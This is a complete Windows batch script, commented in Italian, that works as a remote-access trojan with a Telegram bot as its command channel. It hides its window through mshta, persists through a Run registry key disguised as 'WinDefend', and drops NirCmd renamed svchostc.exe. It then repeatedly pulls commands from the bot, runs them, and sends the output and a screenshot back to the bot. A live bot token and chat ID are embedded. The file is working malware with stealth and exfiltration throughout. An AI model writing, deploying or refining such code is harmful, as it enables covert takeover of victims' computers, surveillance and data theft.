@echo off
:: Tecnica avanzata di invisibilità (no finestra flash)
if "%1"=="hidden" goto main
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""cmd /c start /min cmd /c %~fs0 hidden"", 0, false")(window.close)
exit /b

:main
:: Aggiungi persistenza stealth (chiave di registro nascosta)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinDefend" /t REG_SZ /d "\"%COMSPEC%\" /c start /min \"\" \"%~f0\" hidden" /f >nul 2>&1

:: Configurazione
set "TOKEN=7909916408:AAFTkG0h0HHynabtZGqAXyzkl13TdeIQWhw"
set "CHAT_ID=5709299213"
set "API_URL=https://api.telegram.org/bot%TOKEN%"
set "NIRCMD_PATH=%TEMP%\svchostc.exe"

:: Installazione NirCmd stealth (con nome processo camuffato)
if not exist "%NIRCMD_PATH%" (
    curl -s -L -o "%TEMP%\nircmd.zip" "https://www.nirsoft.net/utils/nircmd.zip" >nul 2>&1
    powershell -nop -c "Expand-Archive -Path '%TEMP%\nircmd.zip' -DestinationPath '%TEMP%\' -Force" >nul 2>&1
    copy "%TEMP%\nircmd.exe" "%NIRCMD_PATH%" >nul 2>&1
    del "%TEMP%\nircmd.*" /q >nul 2>&1
)

:: Invia heartbeat al bot
curl -s -X POST "%API_URL%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=🟢 [%COMPUTERNAME%] Session: %USERNAME%" >nul

:command_loop
:: Nuova tecnica di polling senza file temporanei
for /f "delims=" %%R in ('curl -s "%API_URL%/getUpdates" ^| findstr /C:"text"') do (
    for /f "tokens=2 delims=:" %%C in ("%%R") do (
        set "cmd=%%C"
        set "cmd=!cmd:'=!"
        set "cmd=!cmd:~2,-2!"
        
        if not "!cmd!"=="" (
            :: Esecuzione comando con output completo
            for /f "delims=" %%O in ('cmd /q /c "!cmd! 2>&1"') do set "output=%%O"
            
            :: Invia risultato chunkato (per messaggi lunghi)
            set "chunk=!output:~0,4000!"
            curl -s -X POST "%API_URL%/sendMessage" -d "chat_id=%CHAT_ID%" -d "text=📤 Output [!cmd!]: !chunk!" >nul
            
            :: Screenshot con ritardo per catturare eventuali GUI
            ping -n 2 127.0.0.1 >nul
            "%NIRCMD_PATH%" savescreenshot "%TEMP%\sc_!random!.png" >nul 2>&1
            curl -s -F "chat_id=%CHAT_ID%" -F document=@"%TEMP%\sc_!random!.png" "%API_URL%/sendDocument" >nul
            del "%TEMP%\sc_*.png" >nul 2>&1
            
            :: Cancella update processato
            for /f "tokens=2 delims=:," %%U in ('curl -s "%API_URL%/getUpdates" ^| findstr "update_id"') do (
                set /a "last_id=%%U+1"
                curl -s "%API_URL%/getUpdates?offset=!last_id!" >nul
            )
        )
    )
)

:: Attesa con variazione random per evitare pattern
set /a "delay=5 + !random! %% 10"
timeout /t %delay% >nul
goto command_loop
